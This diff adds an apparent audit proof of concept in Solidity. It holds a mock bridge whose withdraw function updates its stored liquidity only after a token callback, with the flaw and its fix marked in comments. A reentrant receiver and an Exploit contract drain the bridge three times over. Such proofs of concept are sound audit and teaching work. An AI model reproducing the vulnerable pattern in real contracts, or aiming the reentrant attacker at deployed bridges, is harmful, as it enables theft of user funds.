@@ -1,0 +1,10 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+/* Entangle Test Bridge — withdraw updates liquidity after an ERC777-style callback (#51374). */
+interface IRecipient{function tokensReceived() external;}
+contract HookToken{mapping(address=>uint) public balanceOf;function mint(address a,uint x) external{balanceOf[a]+=x;}function transfer(address to,uint x) external returns(bool){require(balanceOf[msg.sender]>=x,"bal");balanceOf[msg.sender]-=x;balanceOf[to]+=x;if(to.code.length!=0){try IRecipient(to).tokensReceived(){}catch{}}return true;}}
+contract EntangleTestBridge{mapping(address=>uint) public tokenStorage;function seed(HookToken t,uint x) external{tokenStorage[address(t)]=x;}function withdraw(HookToken token,uint amount) external{require(tokenStorage[address(token)]>=amount,"liquidity");token.transfer(msg.sender,amount);tokenStorage[address(token)]-=amount; // @> VULN: state update follows the token callback.
+// FIX: decrement tokenStorage before token.transfer and add a reentrancy guard.
+}}
+contract ReentrantReceiver is IRecipient{EntangleTestBridge public immutable victim;HookToken public immutable token;uint public callbacks;uint public constant AMOUNT=100;constructor(EntangleTestBridge v,HookToken t){victim=v;token=t;}function attack() external{victim.withdraw(token,AMOUNT);}function tokensReceived() external{if(callbacks<2){callbacks++;victim.withdraw(token,AMOUNT);}}}
+contract Exploit{HookToken public token;EntangleTestBridge public bridge;ReentrantReceiver public attacker;constructor(){token=new HookToken();bridge=new EntangleTestBridge();attacker=new ReentrantReceiver(bridge,token);token.mint(address(bridge),300);bridge.seed(token,300);}function run() external{attacker.attack();require(token.balanceOf(address(attacker))==300,"triple drain failed");require(bridge.tokenStorage(address(token))==0,"liquidity not exhausted");}}
